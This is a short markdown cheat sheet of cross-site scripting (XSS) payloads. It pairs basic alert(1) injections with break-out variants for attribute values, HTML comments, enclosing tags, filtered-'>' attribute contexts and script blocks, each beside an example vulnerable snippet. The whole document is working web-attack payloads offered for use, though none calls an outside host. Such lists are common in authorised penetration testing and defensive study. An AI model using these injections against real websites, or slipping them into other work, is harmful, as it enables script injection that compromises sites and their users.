# XSS Payloads 
1. Basic payload
```html
<script>alert(1)</script>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
```

2. Add ' or " to escape the payload from value of an HTML tag
```html
"><script>alert(1)</script>
'><script>alert(1)</script> 
```

* Example source code
```html
<input id="keyword" type="text" name="q" value="REFLECTED_HERE">
```

3. Add --> to escape the payload if input lands in HTML comments.
```html
--><script>alert(1)</script>
```

* Example source code
```html
<!-- REFLECTED_HERE --> 
```

4. Add </tag> when the input inside or between opening/closing tags, tag can be <a>,<title,<script> and any other HTML tags
```html
</tag><script>alert(1)</script>
"></tag><script>alert(1)</script>
```

* Example source code
```html
<a class="item-pagination flex-c-m trans-0-4 active-pagination" href="https://target.com/1?status=REFLECTED_HERE">1</a>
```

5. Use when input inside an attribute’s value of an HTML tag but > is filtered
```html
"onmouseover=alert(1)
"autofocus onfocus=alert(1)
```

* Example source code
```html
<input id="keyword" type="text" name="q" value="REFLECTED_HERE">
```

6. Use </script> when input inside <script> tags
```html
</script><script>alert(1)</script>
```

* Example source code
```html
<script>
    var sitekey = "REFLECTED_HERE"
</script>
```


*Will be updated again!
